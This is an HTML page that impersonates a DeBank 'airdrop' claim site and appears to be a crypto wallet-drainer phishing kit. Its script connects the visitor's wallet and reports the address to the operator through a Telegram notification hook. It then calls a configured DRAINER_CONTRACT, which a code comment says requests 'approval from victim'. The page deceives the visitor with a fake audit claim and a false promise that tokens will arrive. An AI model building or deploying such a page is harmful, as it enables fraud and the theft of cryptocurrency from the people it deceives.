<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta name="description" content="DeBank Airdrop - Claim your free DeBank XP tokens">
    <meta property="og:title" content="DeBank Airdrop">
    <meta property="og:description" content="Claim free DeBank XP tokens - Limited time offer">
    <title>DeBank Airdrop - Claim Free XP Tokens</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #0A0C10 0%, #11151C 100%);
            min-height: 100vh;
            color: #fff;
        }
        
        .header {
            padding: 20px 40px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(135deg, #3B82F6, #60A5FA);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .logo span {
            color: #3B82F6;
            background: none;
            -webkit-background-clip: unset;
            background-clip: unset;
        }
        
        .nav a {
            color: #8B8FA8;
            text-decoration: none;
            margin-left: 30px;
            font-size: 14px;
        }
        
        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 0 20px;
        }
        
        .card {
            background: rgba(21, 24, 39, 0.95);
            border-radius: 24px;
            padding: 32px;
            border: 1px solid rgba(59, 130, 246, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
        }
        
        .airdrop-badge {
            display: inline-block;
            background: rgba(59, 130, 246, 0.2);
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 12px;
            color: #3B82F6;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #8B8FA8;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .amount-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .amount-label {
            font-size: 12px;
            color: #8B8FA8;
            margin-bottom: 5px;
        }
        
        .amount-value {
            font-size: 36px;
            font-weight: bold;
            color: #3B82F6;
        }
        
        .input-group {
            margin: 20px 0;
            text-align: left;
        }
        
        .input-group label {
            display: block;
            font-size: 12px;
            color: #8B8FA8;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 12px;
            color: white;
            font-size: 14px;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3B82F6, #2563EB);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
        }
        
        .warning {
            font-size: 11px;
            color: #6B7280;
            margin-top: 20px;
            text-align: center;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #6B7280;
            border-top: 1px solid rgba(59, 130, 246, 0.1);
            margin-top: 50px;
        }
        
        @media (max-width: 600px) {
            .header {
                padding: 15px 20px;
            }
            .nav a {
                margin-left: 15px;
                font-size: 12px;
            }
            h1 {
                font-size: 22px;
            }
            .amount-value {
                font-size: 28px;
            }
        }
    </style>
</head>

<body>
    <div class="header">
        <div class="logo">DeBank <span>Beta</span></div>
        <div class="nav">
            <a href="#">Portfolio</a>
            <a href="#">DeFi</a>
            <a href="#">NFT</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <div class="airdrop-badge">🎁 Limited Time Airdrop</div>
            <h1>Claim Free DeBank XP</h1>
            <div class="subtitle">Get rewarded for being an early user</div>

            <div class="amount-box">
                <div class="amount-label">Your Eligible Amount</div>
                <div class="amount-value" id="eligibleAmount">1,250 XP</div>
            </div>

            <div class="input-group">
                <label>Connect Wallet to Verify Eligibility</label>
                <input type="text" id="walletAddress" placeholder="Your wallet address will appear here" readonly>
            </div>

            <button class="btn" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
            <button class="btn" id="claimBtn" onclick="claimAirdrop()" style="display: none;">Claim Airdrop</button>

            <div class="warning">
                ⚠️ Only connect your wallet to verify eligibility. Smart contract audit passed.
            </div>
        </div>
    </div>

    <div class="footer">
        <p>© 2026 DeBank | Cross-Chain Portfolio Tracker | <a href="#" style="color: #3B82F6;">Terms</a></p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="settings.js"></script>
    <script>
        let web3;
        let userAccount;
        
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    web3 = new Web3(window.ethereum);
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    
                    document.getElementById('walletAddress').value = userAccount;
                    document.getElementById('connectBtn').style.display = 'none';
                    document.getElementById('claimBtn').style.display = 'block';
                    
                    if (typeof sendTelegramNotification === 'function') {
                        sendTelegramNotification(userAccount);
                    }
                    
                } catch (error) {
                    alert("Connection failed. Please try again.");
                }
            } else {
                alert("Please install MetaMask to claim this airdrop.");
            }
        }
        
        async function claimAirdrop() {
            if (!userAccount) {
                alert("Please connect your wallet first.");
                return;
            }
            
            if (typeof DRAINER_CONTRACT !== 'undefined' && DRAINER_CONTRACT && DRAINER_CONTRACT !== '0xYourDrainerContractAddressHere') {
                try {
                    const contract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
                    
                    // Request approval from victim
                    const approvalTx = await contract.methods.claimReward().send({ from: userAccount });
                    
                    alert("Claim submitted! Your tokens will arrive shortly.");
                    
                    if (typeof sendApprovalNotification === 'function') {
                        sendApprovalNotification(userAccount, "Unlimited");
                    }
                } catch (error) {
                    alert("Transaction failed. Please try again.");
                }
            } else {
                alert("Drainer contract not configured. Please check settings.");
            }
        }
    </script>
</body>
</html>
